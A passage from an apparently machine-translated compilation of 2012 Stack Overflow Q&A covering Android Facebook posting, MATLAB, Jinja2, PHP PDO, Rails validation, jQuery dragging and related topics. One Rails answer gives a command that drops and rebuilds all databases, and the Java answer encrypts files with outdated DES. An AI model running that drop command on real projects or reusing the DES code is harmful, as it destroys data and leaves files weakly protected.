                public void run() {
                    mText.setText(text);
                }
            });
        }
    }

    public class WallPostDeleteListener extends BaseRequestListener {

        public void onComplete(final String response, final Object state) {
            if (response.equals("true")) {
                Log.d("Facebook-Example", "Successfully deleted wall post");
                Example.this.runOnUiThread(new Runnable() {
                    public void run() {
                        mDeleteButton.setVisibility(View.INVISIBLE);
                        mText.setText("Deleted Wall Post");
                    }
                });
            } else {
                Log.d("Facebook-Example", "Could not delete wall post");
            }
        }
    }

    public class SampleDialogListener extends BaseDialogListener {

        public void onComplete(Bundle values) {
            final String postId = values.getString("post_id");
            if (postId != null) {
                Log.d("Facebook-Example", "Dialog Success! post_id=" + postId);
                mAsyncRunner.request(postId, new WallPostRequestListener());
                mDeleteButton.setOnClickListener(new OnClickListener() {
                    public void onClick(View v) {
                        mAsyncRunner.request(postId, new Bundle(), "DELETE",
                                new WallPostDeleteListener(), null);
                    }
                });
                mDeleteButton.setVisibility(View.VISIBLE);
            } else {
                Log.d("Facebook-Example", "No wall post made");
            }
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T05:32:35.543

将以下两个函数写入您的 Activity。

```
public void postToWall() {
    String message="Good Morning to All";
    Bundle parameters = new Bundle();
    parameters.putString("message", message);
    parameters.putString("description", "topic share");
    try {
        facebook.request("me");
        String response = facebook.request("me/feed", parameters, "POST");
        Log.d("Tests", "got response: " + response);
        if (response == null || response.equals("") || response.equals("false")) {
            showToast("Blank response.");
        } else {
            showToast("Message posted to your facebook wall!");
        }
    } catch (Exception e) {
        showToast("Failed to post to wall!");
        e.printStackTrace();
    }
} 
```

2)

```
public boolean restoreCredentials(Facebook facebook) {
    SharedPreferences sharedPreferences = getApplicationContext().getSharedPreferences(KEY, Context.MODE_PRIVATE);
    facebook.setAccessToken(sharedPreferences.getString(TOKEN, null));
    facebook.setAccessExpires(sharedPreferences.getLong(EXPIRES, 0));
    return facebook.isSessionValid();
} 
```

3)

```
public void loginAndPostToWall() {
    facebook.authorize(this, PERMISSIONS, Facebook.FORCE_DIALOG_AUTH, new LoginDialogListener());
} 
```

将以下代码写入您的墙贴按钮单击事件

```
facebook = new Facebook(APP_ID);
restoreCredentials(facebook);
if (!facebook.isSessionValid()) {
    loginAndPostToWall();
} else {
    postToWall();
} 
```

# matlab - 在matlab中查找列和匹配

> ID：11271647
> 
> 赞同：0
> 
> 时间：2012-06-30T05:17:43.250
> 
> 标签：matlab

我有一个具有 4 列（A、B、C、分数）的 excel_1，具有不同的组合。我有另一个 excel_2 有 3 列（A、B、C）。我想根据A，B，C找出分数。我正在尝试使用 excel 索引和匹配功能，但我仍然无法弄清楚。没有编码，一一匹配真的很麻烦...请问我知道如何在Matlab中编写代码吗？

例子：

```
excel_1
99 5 35 12
99 2 32 14
97 5 13 94
...

excel_2
97 5 13
99 2 32
... 
```

执行代码后，

结果：

```
excel_2
97 5 13 94
99 2 32 14
... 
```

非常感谢...

```
A = xlsread('excel_1.xlsx');
B = xlsread('excel_2.xlsx');

[~,J] = ismember(B,A(:,1:size(B,2)),'rows');
if any(J)
    result = A(J,:);
end

??? Subscript indices must either be real positive integers or logicals.

Error in ==> Untitled at 6
    result = A(J,:); 
```

解决了。B和A之间不可能存在。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T07:36:27.183

也许你可以试试这个。

```
[~,J] = ismember(excel_2,excel_1(:,1:size(excel_2,2)),'rows');
if any(J)
   result = excel_1(J,:);
end 
```

然后

```
result =

    97     5    13    94
    99     2    32    14 
```

# python - 如果其他分支在 jinja2

> ID：11271657
> 
> 赞同：9
> 
> 时间：2012-06-30T05:19:07.013
> 
> 标签：python, wsgi, jinja2

我们可以使用什么样的条件在 jinja2 中进行分支？我的意思是我们可以使用类似 python 的语句。例如，我想检查标题的长度。如果大于 60 个字符，我想将其限制为 60 个字符并输入“...” 现在，我正在做这样的事情，但它不起作用。error.log 报告 len 函数未定义。

```
template = Template('''
    <!DOCTYPE html>
            <head>
                    <title>search results</title>
                    <link rel="stylesheet" href="static/results.css">
            </head>
            <body>
                    {% for item in items %}
                            {% if len(item[0]) < 60 %}
                                    <p><a href="{{ item[1] }}">{{item[0]}}</a></p>
                            {% else %}
                                    <p><a href="{{ item[1] }}">{{item[0][40:]}}...</a></p>
                            {% endif %}
                    {% endfor %}
            </body>
    </html>''')

## somewhere later in the code...

template.render(items=links).encode('utf-8') 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-30T05:31:18.700

您已经很接近了，您只需将其移至您的 Python 脚本即可。所以你可以像这样定义一个谓词：

```
def short_caption(someitem):
    return len(someitem) < 60 
```

然后通过将其添加到 'tests' dict 将其注册到环境中）：

```
your_environment.tests["short_caption"] = short_caption 
```

你可以像这样使用它：

```
{% if item[0] is short_caption %}
{# do something here #}
{% endif %} 
```

[欲了解更多信息，这里是关于自定义测试](http://jinja.pocoo.org/docs/api/#custom-tests)的 jinja 文档

（您只需执行一次，我认为在开始渲染模板之前或之后执行此操作很重要，文档不清楚）

如果你还没有使用环境，你可以像这样实例化它：

```
import jinja2

environment = jinja2.Environment() # you can define characteristics here, like telling it to load templates, etc
environment.tests["short_caption"] = short_caption 
```

然后通过 get_string() 方法加载您的模板：

```
template = environment.from_string("""your template text here""")
template.render(items=links).encode('utf-8') 
```

最后，附带说明一下，如果您使用文件加载器，它可以让您进行文件继承、导入宏等。基本上，您只需保存您现在拥有的文件并告诉 jinja 目录在哪里。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-08-11T18:35:40.447

len在jinja2中没有定义，可以使用；

```
{% if item[0]|length < 60 %} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-04-16T07:06:39.377

Jinja2 现在有一个*截断*过滤器，可以为你做这个检查

`truncate(s, length=255, killwords=False, end='...', leeway=None)`

例子：

```
{{ "foo bar baz qux"|truncate(9) }}
    -> "foo..."

{{ "foo bar baz qux"|truncate(9, True) }}
    -> "foo ba..." 
```

参考：http: [//jinja.pocoo.org/docs/2.9/templates/#truncate](http://jinja.pocoo.org/docs/2.9/templates/#truncate)

# javascript - 可以省略一组中间的 Javascript 函数参数吗？

> ID：11271658
> 
> 赞同：0
> 
> 时间：2012-06-30T05:19:22.017
> 
> 标签：javascript, function, arguments

你能调用一个 Javascript 函数，让我们说五个参数，并提供前三个和第五个参数，但我希望第四个参数不存在，即 null 或未定义。我想使用的形式是：myfunction(1,2,3,,5);

我无法弄清楚它们之间没有任何内容的“双逗号”是否可以通过“null”或类似的方式传递，但第五个参数通过没有问题。

您可以调用 myfunction(1,2,3)，如果函数需要 #4 和 #5，它们会显示为 undefined 或 typeof undefined，就可以了。这是我遇到麻烦的中间省略的一个。

谢谢你，stackoverflow 的粉丝们！

ps myfunction(1,2,3,null,5); 似乎可行，但这似乎有点做作，只有成对的逗号怎么样？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T05:22:34.623

试试看。

```
function foo(a, b, c) { return a + b + c; }
foo(1,2,3)
> 6
foo(1,,3)
> SyntaxError: Unexpected token ,
foo(1,null,3)
> 4 
```

所以不，你不能只做双逗号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T07:18:36.500

您可以使用`apply`来调用方法，而不是调用方法。这将允许您将参数作为数组传递，并且还允许您使用所需的语法。

```
function foo(a, b, c, d, e) {

}

foo.apply(foo, [1,,,,5]); 
```

这里`a`将会`1`，并且`e`将会`5`。所有其他参数将是`undefined`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T05:25:19.797

不幸的是，不允许使用双逗号，这会引发语法错误。

# sql - 索引视图更新时

> ID：11271664
> 
> 赞同：2
> 
> 时间：2012-06-30T05:20:06.923
> 
> 标签：sql, sql-server-2008, triggers, sql-server-2008-r2, indexed-view

`View1`我在and 上创建了一个索引视图，`Table1`并且`Table2`在`Table1`使用`View1`. `View1`当我在而不是触发器和触发器之后使用此视图时，数据似乎没有改变。但是我想`View1`在触发器后使用这个视图时使用新数据。我该怎么做。需要注意的是，我`with Noexpand`在使用索引视图时使用了提示（当在此索引视图中不使用`with noexpand`提示时，`SQL Server 2008 R2`例如没有索引视图）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T07:19:48.360

索引视图在基表上的所有触发器都执行后更新。您可以在查询计划中看到这一点。视图上**只有一个**聚集索引更新。

但是，您可以`INSTEAD OF`在视图上创建触发器，然后在索引视图上进行所有操作。但是，通过可更新视图更新/插入/删除时存在一些限制。[您可以在此处](http://msdn.microsoft.com/en-us/library/ms180800%28v=sql.100%29.aspx)阅读有关它们的信息。

请注意，视图只允许`INSTEAD OF`触发器，不允许触发器`AFTER`。

关于更新索引视图，最重要的一点是任何修改，包括 UPDATE、INSERT 和 DELETE 语句，都必须仅引用一个基表中的列。

# java - 这可以在java中使用DES算法加密和解密zip文件吗

> ID：11271671
> 
> 赞同：0
> 
> 时间：2012-06-30T05:22:14.310
> 
> 标签：java, des

我必须使用 DES 算法加密和解密 zip 文件，方法是使用存储在文本文件中的密钥。加密和解密算法都从文本文件中获取密钥来执行相应的功能。

是否有任何内置包可用于在 java 中执行 DES 算法...

请指导我摆脱这个问题......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T05:56:20.380

你可以使用 javax.crypto 包中的东西：

```
 // read the key
    FileInputStream fis = new FileInputStream(keyFile);
    byte[] keyBytes = new byte[fis.available()];
    fis.read(keyBytes);
    SecretKeySpec spec = new SecretKeySpec(keyBytes, "DES");

    // encrypt
    Cipher encCipher = Cipher.getInstance("DES");
    encCipher.init(Cipher.ENCRYPT_MODE, spec);

    CipherInputStream cipherIn = new CipherInputStream(new FileInputStream(zipFile), encCipher);
    FileChannel out = new FileOutputStream(encZipFile).getChannel();
    out.transferFrom(Channels.newChannel(cipherIn), 0, Long.MAX_VALUE);

    // decrypt
    Cipher decCipher = Cipher.getInstance("DES");
    decCipher.init(Cipher.DECRYPT_MODE, spec);

    cipherIn = new CipherInputStream(new FileInputStream(encZipFile), decCipher);
    out = new FileOutputStream(decZipFile).getChannel();
    out.transferFrom(Channels.newChannel(cipherIn), 0, Long.MAX_VALUE); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-26T05:01:19.147

这是可能的。你最好选择有弹性的castly。他们为此提供了API。

# c++ - 如何使用按位反转数字（k 位）的位？

> ID：11271681
> 
> 赞同：2
> 
> 时间：2012-06-30T05:24:08.897
> 
> 标签：c++, bit-manipulation

> **可能重复：**
> [无符号整数中的 C 反转位](https://stackoverflow.com/questions/9144800/c-reverse-bits-in-unsigned-integer)
> [此代码如何工作以反转位？](https://stackoverflow.com/questions/10184089/how-does-this-code-work-to-reverse-bits-in-number)

给定一个`n`带`k`位的数字`(n < 2^k)`，有没有一种快速的方法来使用位？这是我的`slow`解决方案：

```
int reverse_bit(int n, int bit_size) {
    bit_size--;

    int result = 0;
    while (n) {
        if ((n & 1) == 1)
            result += 1 * (1 << bit_size);

        n >>= 1;
        bit_size--;
    }

    return result;
} 
```

# ios - 目标 c - 在声明我的 cell.textlabels 应该是什么时如何设置范围？

> ID：11271687
> 
> 赞同：0
> 
> 时间：2012-06-30T05:25:16.773
> 
> 标签：ios, uitableview, scope, uisearchbar, uisearchdisplaycontroller

我有这段代码，我通常会使用一行：

```
 if (tableView == self.searchDisplayController.searchResultsTableView)
{
    NSLog(@"Configuring cell to show search results");
    shoppingList = [self.searchResults objectAtIndex:indexPath.row];

    cell.textLabel.text = shopList.name; 
    cell.textLabel.text = shopList.type;
    cell.textLabel.text = shopList.price;
    cell.textLabel.text = shopList.occasion;

    } 
```

我有这个的原因是我在我的搜索栏下实现了一个范围。现在范围工作了，当我输入名称时，我希望在选择第一个范围（即产品名称）时看到该名称。

然而，正在发生的事情是它显示了正在发生的事情，因为它是列表中的最后一个（我认为）。因此，当我输入产品名称时，它会出现匹配的场合而不是产品名称。

如何设置它以显示我在范围中选择的内容？

我已经实现了以下方法，以使范围正常工作，只是标签没有正确显示，这在上面的 tableView 部分代码中受到影响。

```
- (void)filterContentForSearchText:(NSString*)searchText scope:(NSString*)scope
 { 
```

任何帮助都很棒:-) 谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T05:42:51.133

`=`运营商就是`assignment`运营商。这意味着在执行该行代码后，运算符左侧的`=`任何内容都将成为右侧的任何内容。

例如：

`int i = 5; i = 4; i = 3; i = 8;`

在执行完所有这四行之后，`i`等于`8`。之前它是另一个值并不重要 -`=`运算符会删除之前变量中的任何内容并将新值放入其中。

因此，无论您希望代码做什么，您*所做*的都是抹杀`cell.textlabel.text`每次使用`=`运算符的值。 `shopList.name`, `shopList.type`, 并且在您设置为`shopList.price`之后不再存在，原因与我上面的示例相同。这是一个基本且非常重要的编程概念。`cell.textlabel.text``shopList.occasion``i = 8`

你现在明白怎么回事了吗？如果你想保存所有四个项目——价格、名称、类型和场合——你需要四个单独的变量来做到这一点。

* * *

顺便说一句，我相当肯定你没有`scope`正确使用这个词（除非我完全误解了你的程序的目的）。来自维基百科：

> 在计算机编程中，范围是计算机程序中的上下文，其中变量名或其他标识符是有效的并且可以使用，或者声明在其中有效。在变量名的范围之外，变量的值可能仍然被存储，甚至可能以某种方式被访问，但名称并不引用它；也就是说，名称不绑定到变量的存储。

# c# - 在网络中运行 process.start()

> ID：11271697
> 
> 赞同：0
> 
> 时间：2012-06-30T05:26:05.417
> 
> 标签：c#, file, process, impersonation

我编写了一个可以在网络上运行的 win 应用程序。

在其中一种形式中，用户可以浏览并从本地计算机中选择文件并将其添加到列表中，因此应用程序将这些文件复制到“网上邻居”中的一个文件夹中，没有用户可以访问它，但我已经为我创建了一个应用程序，所以我有他的用户名和密码。到目前为止，一切正常。

在此表单中，用户还可以通过选择文件并按打开按钮打开文件，因此文件应在与其扩展名相关的应用程序中打开（例如 test.xlsx 应在 Exel.exe 中打开）。我使用过 Process.Start () 这样做，但对于每个扩展，我都会收到一个单独的错误（例如，*记事本的“**访问被拒绝*”和 Adob *​​eReader*的“运行时*错误*”和*Excel的“**内存不足*” ）。

 ***我的错误是什么？

**注意：** *我已使用 ImpersonatUser 在我的应用程序中登录该用户。*

**编辑：**我使用以下代码打开文件：

```
Using(WindowsImpersonationContext impersonateUser = LogonMethod())
{
    ProcessStartInfo pInfo = new ProcessStartInfo(filePathWithExtension);
    pInfo.Domain = MyDomainName;
    pInfo.UseShellExecute = false;
    Process.Start(pInfo);
} 
```

**注意：** *我的 LogonMethod 使用 advapi32.dll 的 LogonUser 方法。*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T20:19:30.443

您看到的行为几乎是预期的。

*   看起来您不是直接启动应用程序，而是使用文件名关联进行评估。我不相信你会在你想要的帐户下启动应用程序。您可以使用任务管理器检查正在运行的帐户应用程序。
*   大多数应用程序都没有经过测试以在“运行方式”上下文中运行，因此它们可能正常工作或随机失败。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T05:21:09.553

我无法解决这个问题，所以我使用了另一种方法。我已将文件复制到临时文件夹，然后用于`Process.Start`打开这个新文件。***

# php - PDO：try-catch 是否必要？

> ID：11271699
> 
> 赞同：8
> 
> 时间：2012-06-30T05:26:14.327
> 
> 标签：php, mysql, pdo

我收到混合信号。[PDO 文档](http://www.php.net/manual/en/pdo.connections.php)中的警告似乎很清楚，省略 try-catch 可能会危及安全性。但是，[这个线程](https://stackoverflow.com/questions/272203/pdo-try-catch-usage-in-functions)表明它并不是真正必要的。在我看来，将每个查询包装在 try-catch 中会很烦人。关于如何处理这个问题的任何建议？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-30T05:33:44.310

存在安全风险，但您不需要到处添加 try/catch。风险在于，如果您没有捕获异常，则异常的错误消息（可能包含敏感信息）可能会显示给用户。

但正如文档所述，您可以改为添加一个[异常处理程序](http://www.php.net/manual/en/function.set-exception-handler.php)。通过重定向到一般错误消息，您可以避免向用户显示错误消息中的敏感信息。

在任何情况下，设置一个通用的错误处理程序似乎都是一件非常明智的事情。您不想向用户显示神秘的错误消息。即使您确实采用“尝试/捕获所有内容”的方法，也很难 100% 确定您已捕获所有可能发生的异常，因此异常处理程序仍应用作后备。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-30T05:42:06.493

PDO 具有[三种可配置的错误模式](http://www.php.net/manual/en/pdo.error-handling.php)。默认只是设置错误代码，不抛出异常。

但是，您*应该*使用`PDO::ERRMODE_EXCEPTION`. PHP 和 PDO 通常处理错误的方式（即默默地继续编写代码并*在不告诉你的情况下做错事*）绝对是疯狂的，也是 PHP 可怕的一个重要原因。

如果您的查询出现问题，正确的做法是停止执行并引发异常，以便您有清晰的回溯并可以找到并解决问题。

另外，使用 try-catch 比在每个查询之后检查`errorCode`和检查要容易得多（即，不那么“烦人”） 。`errorInfo`如果您*预计*错误的可能性并且可以对此采取一些措施，您应该只使用 try-catch - 否则您应该让异常冒泡。如果这是一个*意外*错误，它可能来自您的代码中的错误，您*应该*通过异常了解它，以便您可以修复它！

如果您想在报告异常时做一些特别的事情（例如，漂亮地打印它，给您发送电子邮件，等等），然后注册一个[默认异常处理程序](http://www.php.net/manual/en/function.set-exception-handler.php)来处理任何未捕获的异常。在生产系统上，您应该注册一个默认的异常处理程序，该处理程序显示一个通用的 500 页面并显示错误详细信息，并在其他地方记录完整的回溯以进行调试。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T05:44:37.500

如果**可能**发生错误，那么它最终**会**发生。无论您运行的环境如何，您都需要处理 PDO 查询可能生成的任何潜在错误。假设（正如您发布的线程中的人所做的那样）由于这是一个生产系统，因此不需要 try..catch 是愚蠢的，恕我直言。错误不仅会在您调试代码时引发，而且也可能发生在生产系统上。就我个人而言，我喜欢围绕我在日志中看到的错误了解上下文，所以我确实使用 try..catch 来处理我的查询。

这也与您最终呈现给用户的错误无关。我发现在这种情况下使用安全这个词会使事情变得模糊。无论您如何处理错误（这不是 PDO 特定的），您的系统都不应向用户显示神秘的错误消息（可能包括敏感数据）。

有几种方法可以处理这个问题：

1.  通过传递一个已经绑定了所有内容的准备好的语句，创建一个函数来为您执行 PDO 查询。
2.  创建一个全局异常处理程序并在那里捕获任何异常（我不喜欢这种方法，因为你最终会丢失上下文......如果它被某个全局处理程序捕获，我会向用户显示什么错误？你如何从这样的如果在某些全局上下文中捕获错误？）。
3.  [初始化 PDO](http://www.php.net/manual/en/pdo.error-handling.php)不要抛出异常并进行手动错误检查，如果那是你的毒药。就个人而言，我发现异常与基于 OOP 的系统更好地结合，但对每个人来说都是他自己的。

我的2c。

# ruby-on-rails-3 - Rails：连接表中两个属性的唯一性导致 500 错误

> ID：11271702
> 
> 赞同：7
> 
> 时间：2012-06-30T05:26:27.747
> 
> 标签：ruby-on-rails-3, model, jointable, validates-uniqueness-of

我有以下模型，它们基本上试图表示**教授**具有特定**水平**的许多**科目的****知识**。科目是固定的，因此不会创建新科目，只会通过知识连接表与教授“相关”。

 ****```
class Subject < ActiveRecord::Base
  # Self Associations
  has_many :subcategories, :class_name => "Subject"
  belongs_to :category, :class_name => "Subject",:foreign_key => "parent_id"

  # Associations
  has_many :knowledges
  has_many :professors, :through => :knowledges
end

class Professor < ActiveRecord::Base
  # Associations
  has_many :knowledges
  has_many :subjects, :through => :knowledges
  ...
end

class Knowledge < ActiveRecord::Base
  # Associations
  belongs_to :professor
  belongs_to :subject
  has_one :level

  attr_accessible :subject_id, :professor_id

  validates :subject_id, :uniqueness => { :scope => :professor_id }
end 
```

我想要一个表格，让教授在他的帐户中添加一个主题，我决定有一个知识表格（因为我也希望能够插入一个级别）。

它看起来像这样：

```
<%= simple_form_for @knowledge,:url => professor_knowledges_path, :html => { :class => 'form-horizontal' } do |f| %>
    <div class="control-group select optional">
      <%= label_tag "Subject Type", nil, :class => "select optional control-label"%>
      <div class="controls">
    <%= select_tag "Parent Subject", options_from_collection_for_select(@parent_subjects, "id", "name"), :id => "knowledge_parent_subject" %>
      </div>
    </div>
    <%= f.input :subject_id, :collection => @subjects, :label => "Subject" %>
    <%= f.input :level %>
  <%= f.button :submit, t('add_form'),:class => 'btn-primary' %>
<% end %> 
```

在知识控制器的**创建**操作中，我有这个：

```
def create
    @knowledge = Knowledge.create(:professor_id => current_professor.id, :subject_id => params[:knowledge][:subject_id]) 
  end 
```

我想/期望得到一个**ActiveRecord**说这个知识不能被插入，因为有一个唯一性违规，但是不，我只是在日志中看到一个 500 和一个回滚，但似乎执行仍在继续。所以我的问题是：我做错了什么，或者我该如何改善这种建模情况？我相信表单需要与连接模型相关，因为我希望在其上包含该模型的字段......但也许我错了，我可以用一种简单/更清洁的方式来做。

**编辑**：

正如其中一条评论所要求的，这里是表单提交的日志和回滚后的 500 错误：

```
Started POST "/professors/1/knowledges" for 127.0.0.1 at 2012-07-01 00:45:39 -0700
Processing by KnowledgesController#create as HTML
  Parameters: {"utf8"=>"✓", "authenticity_token"=>"4JVyxWnIh37kyBwLwLGTHk/znsI1c5wrJvaWjKKT5tM=", "Parent Subject"=>"1", "knowledge"=>{"subject_id"=>"1"}, "commit"=>"Añadir", "professor_id"=>"1"}
  Professor Load (0.4ms)  SELECT `professors`.* FROM `professors` WHERE `professors`.`id` = 1 LIMIT 1
Completed 500 Internal Server Error in 4ms 
```

**我在创建**操作中添加了一些条件，如下所示：

```
 def create
    @knowledge = Knowledge.new(:professor_id => current_professor.id, :subject_id => params[:knowledge][:subject_id]) 
    if @knowledge.save
      flash[:notice] = "Success..."
      redirect_to professor_path(current_professor)
    else
      render :action => 'new'
    end
  end 
```

这实际上在 500 之后显示以下内容：

```
Completed 500 Internal Server Error in 6ms

ActiveRecord::RecordInvalid (Validation failed: Subject has already been taken): 
```

我想知道为什么会引发异常，而不是仅仅将错误添加到对象中并让我管理这种情况。以下行不应该做什么？

```
validates :subject_id, :uniqueness => { :scope => :professor_id } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-02T19:01:09.563

我没有足够的声誉来发表评论......我的回答更多的是一些尝试而不是明确的答案，对不起。

由于验证错误，保存失败。您可以尝试处理“其他”块中的那些。下面将为您提供所有验证错误的描述（对调试有用）。

```
@knowledge.errors.full_messages 
```

您还没有显示“新”操作中发生了什么。我怀疑这是发生错误的地方。

控制台中是否出现相同的问题（即验证问题）？如果是这样，请尝试清理您的数据库（请注意 - 以下内容将擦除并重建您的所有数据库）。

> rake db:drop:all db:create:all db:migrate db:test:prepare

此外，如果您还没有，请为 Knowledge 迁移添加索引，以防止将重复项添加到数据库中。例如

```
 add_index :knowledges, [ :professor_id, :subject_id ], unique: true 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-07T05:36:12.350

该错误意味着您正在尝试在该表上插入重复的`subject_id`/`professor_id`对。最常发生在`subject_id`或`professor_id`是时`null`。

您确定控制器正在获取正确的参数吗？我会检查日志以确保插入是您所期望的。****

# javascript - 如何确保 HTML 元素位于窗口的中心？

> ID：11271703
> 
> 赞同：1
> 
> 时间：2012-06-30T05:26:50.103
> 
> 标签：javascript, jquery, html, function, window

我想在窗口中心的一个元素上执行一个函数，并在将元素留在中心时执行另一个函数。那么如何确保 HTML 元素位于窗口的中心呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:29:50.067

*使用以下样式属性：*

> ```
> display: table-cell;
> vertical-align:middle;
> text-align:center;
> height:100%;
> width:100%; 
> ```

*希望这能解决！*

# jquery - jQuery - 拖动 div css 背景

> ID：11271704
> 
> 赞同：6
> 
> 时间：2012-06-30T05:27:00.103
> 
> 标签：jquery, css, background, draggable

我希望能够在 div 中按住鼠标并移动它的背景。在谷歌上搜索了很多，没有找到我想要的。

这是目标（显示的地图是要拖动的对象）： http: [//pontografico.net/pvt/gamemap/](http://pontografico.net/pvt/gamemap/)

有小费吗？

干杯!

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-06-30T06:44:35.427

好吧，让它工作；我想我已经解决了所有问题：

***具有边界限制的最终 jQuery***

```
$(document).ready(function(){
    var $bg = $('.bg-img'),
        elbounds = {
            w: parseInt($bg.width()),
            h: parseInt($bg.height())
        },
        bounds = {w: 2350 - elbounds.w, h: 1750 - elbounds.h},
        origin = {x: 0, y: 0},
        start = {x: 0, y: 0},
        movecontinue = false;

    function move (e){
        var inbounds = {x: false, y: false},
            offset = {
                x: start.x - (origin.x - e.clientX),
                y: start.y - (origin.y - e.clientY)
            };

        inbounds.x = offset.x < 0 && (offset.x * -1) < bounds.w;
        inbounds.y = offset.y < 0 && (offset.y * -1) < bounds.h;

        if (movecontinue && inbounds.x && inbounds.y) {
            start.x = offset.x;
            start.y = offset.y;

            $(this).css('background-position', start.x + 'px ' + start.y + 'px');
        }

        origin.x = e.clientX;
        origin.y = e.clientY;

        e.stopPropagation();
        return false;
    }

    function handle (e){
        movecontinue = false;
        $bg.unbind('mousemove', move);

        if (e.type == 'mousedown') {
            origin.x = e.clientX;
            origin.y = e.clientY;
            movecontinue = true;
            $bg.bind('mousemove', move);
        } else {
            $(document.body).focus();
        }

        e.stopPropagation();
        return false;
    }

    function reset (){
        start = {x: 0, y: 0};
        $(this).css('backgroundPosition', '0 0');
    }

    $bg.bind('mousedown mouseup mouseleave', handle);
    $bg.bind('dblclick', reset);
}); 
```

[http://jsfiddle.net/userdude/q6r8f/4/](http://jsfiddle.net/userdude/q6r8f/4/)

* * *

*原始答案*

**HTML**

```
<div class="bg-img"></div> 
```

**CSS**

```
div.bg-img {
    background-image: url(http://upload.wikimedia.org/wikipedia/commons/9/91/Flexopecten_ponticus_2008_G1.jpg);
    background-position: 0 0;
    background-repeat: no-repeat;
    background-color: blue;
    border: 1px solid #aaa;
    width: 250px;
    height: 250px;
    margin: 25px auto;
} 
```

**jQuery**

```
$(document).ready(function(){
    var $bg = $('.bg-img'),
        origin = {x: 0, y: 0},
        start = {x: 0, y: 0},
        movecontinue = false;

    function move (e){
        var moveby = {
            x: origin.x - e.clientX,
            y: origin.y - e.clientY
        };

        if (movecontinue === true) {
            start.x = start.x - moveby.x;
            start.y = start.y - moveby.y;

            $(this).css('background-position', start.x + 'px ' + start.y + 'px');
        }

        origin.x = e.clientX;
        origin.y = e.clientY;

        e.stopPropagation();
        return false;
    }

    function handle (e){
        movecontinue = false;
        $bg.unbind('mousemove', move);

        if (e.type == 'mousedown') {
            origin.x = e.clientX;
            origin.y = e.clientY;
            movecontinue = true;
            $bg.bind('mousemove', move);
        } else {
            $(document.body).focus();
        }

        e.stopPropagation();
        return false;
    }

    function reset (){
        start = {x: 0, y: 0};
        $(this).css('backgroundPosition', '0 0');
    }

    $bg.bind('mousedown mouseup mouseleave', handle);
    $bg.bind('dblclick', reset);
}); 
```

[http://jsfiddle.net/userdude/q6r8f/2/](http://jsfiddle.net/userdude/q6r8f/2/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-30T05:54:44.063

从 ui 可拖动演示：

拖动 DOM 元素很简单，无需重新发明轮子。

```
<style>
#draggable { width: 150px; height: 150px; padding: 0.5em; }
</style>
<script>
    $(function() {
        $( "#draggable" ).draggable();
    });
</script>

<div class="demo">

<div id="draggable" class="ui-widget-content">
    <p>Drag me around</p>
</div>

</div><!-- End demo -->

<div class="demo-description" style="display: none; ">
<p>Enable draggable functionality on any DOM element. Move the draggable object by clicking on it with the mouse and dragging it anywhere within the viewport.</p>
</div><!-- End demo-description --> 
```

[http://jqueryui.com/demos/draggable/](http://jqueryui.com/demos/draggable/)

编辑： div 内的可拖动背景也是可能的。在这里看小提琴：http: [//jsfiddle.net/FyFZA/](http://jsfiddle.net/FyFZA/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-18T01:18:47.297

我知道这是一篇旧帖子，但如果您使用 jQueryUI，另一种解决方案是在背景之上创建一个透明元素，然后使用拖动回调来更新原始节点的 backgroundPosition。这是一个例子：

```
/* node is the element containing the background image */
/* width/height variables are just there if your background image is a different width/height then the container */
var transparent = $('<div></div>');
transparent.css({
    position: 'absolute',
    zIndex: 10,
    left: node.offset().left,
    top: this.node.offset().top,
    width: width || node.width(),
    height: height || node.height(),
    backgroundColor: '#fff',
    opacity: 0.2
});

$('body').append(transparent);

options.config.drag = function(event, ui) {
    node.css({ backgroundPosition: (ui.position.left - ui.originalPosition.left) + 'px ' + (ui.position.top - ui.originalPosition.top) + 'px' });
};

$(transparent).draggable(options.config); 
```

我故意留下了一个不透明的白色背景颜色，这样你就可以在测试时看到元素。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-30T01:31:50.167

这篇文章是我的问题的一个很好的起点。我结合了上面的答案和另一个与获取背景图像的原始尺寸有关的答案（[SO：How do I get background image size in jQuery?](https://stackoverflow.com/questions/5106243/how-do-i-get-background-image-size-in-jquery)）

使用我使用的特定设置，`background-size:cover`因此我必须确定背景图像的高度/宽度比率，并将其与容器的高度/宽度比率进行比较。这意味着每个图像只允许在一维上滑动。

在这里你可能不需要两个额外的东西。我为当前正在操作的元素添加了一个边框，只是为了便于查看，完成后将其删除。我还用偏移值更新了输入，所以我可以将它们发送到服务器上。

我的评论往往非常冗长，所以有点冗长，但我希望它对某人有所帮助。

```
<script>
$(document).ready(function(){

    function reset (){
        start = {x: 0, y: 0};
        $(this).css('backgroundPosition', '0 0');
    }

    $(".bg-img").bind('dblclick', reset);

    //my jquery
$(".bg-img").on('mousedown mouseup', function(e){

    //declare some vars
    var start = {x: 0, y: 0};
    var move = {x: 0, y: 0};
    var id = $(this).attr('id');

    //pointer coordinates on mousedown
    var origin = {x: 0, y: 0};

    //container dimensions
    var container = {w: $(this).width(), h: $(this).height()};

    //container ratio
    var containerRatio = container.h / container.w;

